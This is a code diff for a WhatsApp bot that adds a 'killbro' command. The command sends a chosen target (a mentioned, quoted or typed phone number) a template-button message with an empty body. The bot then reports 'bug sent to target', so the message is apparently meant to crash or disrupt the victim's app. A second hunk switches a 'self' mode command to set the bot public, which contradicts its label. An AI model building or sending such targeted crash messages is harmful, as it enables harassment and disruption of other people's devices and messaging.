@@ -1503,17 +1503,19 @@ break
 //=================================================//
 case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': case 'killbro': {
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-Pe = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(Pe, { 
-text: `anjay`, 
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+a = await haikal.sendMessage(m.chat, {react: { text: "🗿", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+haikal.sendMessage(Pe, {text: '', 
 templateButtons: [
-{ callButton: { displayText: `Number Phone Owner1`, phoneNumber: `owner`}},
-{ callButton: { displayText: `Number Phone Owner2`, phoneNumber: `owner`}},
-{ callButton: { displayText: `Number Phone Owner3`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
-{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
-{ urlButton: { displayText: `ID GORUP2`, url: 'https://www.whatsapp.com/otp/copy/'}},
-], 
+{ callButton: { displayText: `OWNER`, phoneNumber: `62895403595055`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `62895403595055`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `62895403595055`}},
+{ urlButton: { displayText: `GROUP`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
+{ urlButton: { displayText: `GROUP`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
+{ urlButton: { displayText: `GROUP`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
+{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
+{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
+{ quickReplyButton: { displayText: `CASPER`, id: `JAGOAN OM?`}},]
  })
  reply('sukses send bug kepada target')
 }
@@ -2587,7 +2589,7 @@ break
 case 'self': {
 if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.public = false
+haikal.public = true
 reply('Sukses Change To Self')
 }
 break
